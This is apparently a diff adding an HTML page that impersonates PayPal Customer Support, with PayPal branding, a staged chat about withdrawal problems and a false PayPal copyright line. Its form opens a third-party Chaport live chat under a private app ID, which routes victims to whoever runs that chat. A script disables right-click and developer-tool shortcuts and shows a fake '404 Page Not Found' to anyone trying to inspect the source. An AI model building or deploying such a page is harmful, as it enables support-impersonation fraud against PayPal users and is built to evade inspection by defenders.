@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>PayPal Support</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: #f0f2f5;
+      font-family: "Helvetica Neue", sans-serif;
+      color: #333;
+      animation: fadeIn 1s ease-in;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    header {
+      background: #003087;
+      color: white;
+      text-align: center;
+      padding: 20px 0;
+      font-size: 26px;
+      font-weight: bold;
+      letter-spacing: 1px;
+    }
+
+    .logo {
+      display: block;
+      margin: 20px auto 10px;
+      width: 70px;
+      height: 70px;
+      border-radius: 50%;
+      object-fit: cover;
+      border: 3px solid #0070ba;
+    }
+
+    .container {
+      max-width: 500px;
+      margin: 0 auto;
+      background: #fff;
+      padding: 25px;
+      border-radius: 12px;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08);
+      animation: fadeIn 1.2s ease-in;
+    }
+
+    .chat-box {
+      background: #f7f9fc;
+      border: 1px solid #dce1e6;
+      padding: 15px;
+      border-radius: 10px;
+      margin-bottom: 20px;
+    }
+
+    .message {
+      margin: 12px 0;
+      line-height: 1.5;
+    }
+
+    .support {
+      color: #003087;
+    }
+
+    .user {
+      text-align: right;
+      color: #0070ba;
+    }
+
+    form input, form textarea {
+      width: 92%;
+      padding: 12px;
+      margin-top: 10px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      font-size: 16px;
+    }
+
+    form textarea {
+      resize: vertical;
+    }
+
+    form button {
+      margin-top: 15px;
+      padding: 12px;
+      background: #0070ba;
+      border: none;
+      color: white;
+      font-size: 16px;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    form button:hover {
+      background: #005ea6;
+    }
+
+    footer {
+      text-align: center;
+      font-size: 14px;
+      color: #888;
+      margin: 30px 0 10px;
+    }
+
+  </style>
+</head>
+<body>
+
+  <header>PayPal Customer Support</header>
+
+  <!-- PayPal Logo -->
+  <img src="PayPal.png" alt="PayPal Logo" class="logo" />
+
+  <div class="container">
+    <div class="chat-box">
+      <div class="message support">Hello! Welcome to PayPal Support. How can we help you today?</div>
+      <div class="message user">I'm having trouble making withdrawals.</div>
+      <div class="message support">Thank you for reaching out. Please describe your issue below and we'll assist you shortly.</div>
+    </div>
+
+    <form onsubmit="openChaport(); return false;">
+      <input type="text" placeholder="Your Name" required />
+      <textarea placeholder="Describe your issue..." rows="4" required></textarea>
+      <button type="submit">Submit to Live Chat</button>
+    </form>
+  </div>
+
+  <footer>
+    All rights reserved © PayPal 2025
+  </footer>
+
+  <!-- Chaport Live Chat Code -->
+  <script type="text/javascript">
+    (function(w,d,v3){
+      w.chaportConfig = { appId : '685dc0710126179415656875' };
+      if(w.chaport) return;
+      v3 = w.chaport = {}; v3._q = []; v3._l = {};
+      v3.q = function(){ v3._q.push(arguments) };
+      v3.on = function(e,fn){ if(!v3._l[e]) v3._l[e] = []; v3._l[e].push(fn) };
+      var s = d.createElement('script');
+      s.type = 'text/javascript'; s.async = true;
+      s.src = 'https://app.chaport.com/javascripts/insert.js';
+      var ss = d.getElementsByTagName('script')[0];
+      ss.parentNode.insertBefore(s, ss);
+    })(window, document);
+
+    function openChaport() {
+      if (window.chaport) {
+        chaport.q('open');
+      } else {
+        alert("Live chat is loading, please wait a moment and try again.");
+      }
+    }
+  </script>
+
+  <!-- Block Inspect/Source Code -->
+  <script>
+    document.addEventListener('contextmenu', event => event.preventDefault());
+
+    document.onkeydown = function(e) {
+      if (
+        e.keyCode === 123 || // F12
+        (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || // Ctrl+Shift+I/J
+        (e.ctrlKey && e.keyCode === 85) // Ctrl+U
+      ) {
+        fakeErrorPage();
+        return false;
+      }
+    };
+
+    function fakeErrorPage() {
+      document.body.innerHTML = "<h1 style='text-align:center; margin-top:50px;'>404 Page Not Found</h1>";
+      document.body.style.backgroundColor = "white";
+      document.title = "404 Not Found";
+    }
+  </script>
+
+</body>
+</html>
